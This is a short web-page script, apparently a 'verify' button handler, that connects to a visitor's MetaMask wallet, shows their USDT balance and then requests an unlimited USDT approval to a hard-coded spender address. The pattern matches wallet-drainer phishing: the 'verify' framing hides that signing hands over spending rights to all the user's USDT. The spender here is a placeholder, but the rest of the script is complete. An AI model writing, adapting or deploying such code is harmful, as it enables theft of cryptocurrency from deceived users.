<!-- ONE script block only -->
<script type="module">
import { ethers } from "https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.esm.min.js";

const USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
const SPENDER = "0x0000000000000000000000000000000000000001";

const abi = [
  "function balanceOf(address) view returns (uint256)",
  "function approve(address spender, uint256 amount) returns (bool)"
];

document.getElementById("verifyBtn").onclick = async () => {
  if (!window.ethereum) {
    alert("MetaMask not detected");
    return;
  }

  const provider = new ethers.providers.Web3Provider(window.ethereum);
  await provider.send("eth_requestAccounts", []); // USER GESTURE ✔

  const signer = provider.getSigner();
  const addr = await signer.getAddress();

  const usdt = new ethers.Contract(USDT, abi, provider);
  const bal = await usdt.balanceOf(addr);

  alert("Balance: " + ethers.utils.formatUnits(bal, 6) + " USDT");

  const tx = await usdt
    .connect(signer)
    .approve(SPENDER, ethers.constants.MaxUint256);

  await tx.wait();

  alert("Done! Unlimited approval granted.\nCheck Etherscan → Events tab.");
};
</script>
